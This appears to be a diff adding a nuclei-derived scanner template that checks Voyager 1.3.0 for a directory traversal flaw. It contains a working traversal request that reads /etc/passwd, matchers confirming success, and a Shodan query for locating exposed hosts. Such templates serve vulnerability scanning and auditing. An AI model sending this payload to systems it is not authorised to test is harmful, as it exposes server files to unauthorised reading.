@@ -1,0 +1,166 @@
+{
+  "id": "voyager-lfi",
+  "name": "Voyager 1.3.0 - Directory Traversal",
+  "author": "mammad_rahimzada",
+  "severity": "HIGH",
+  "description": "Voyager 1.3.0 is vulnerable to local file inclusion.\n",
+  "references": [
+    "https://www.exploit-db.com/exploits/47875"
+  ],
+  "tags": [
+    "voyager",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "html:\"voyager-assets\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "7.5",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/admin/voyager-assets?path\u003d.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "text/plain"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "voyager-lfi",
+    "info": {
+      "name": "Voyager 1.3.0 - Directory Traversal",
+      "author": "mammad_rahimzada",
+      "severity": "high",
+      "description": "Voyager 1.3.0 is vulnerable to local file inclusion.\n",
+      "reference": [
+        "https://www.exploit-db.com/exploits/47875"
+      ],
+      "classification": {
+        "cvss_score": "7.5",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "html:\"voyager-assets\""
+      },
+      "tags": "voyager,lfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/admin/voyager-assets?path\u003d.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "text/plain"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
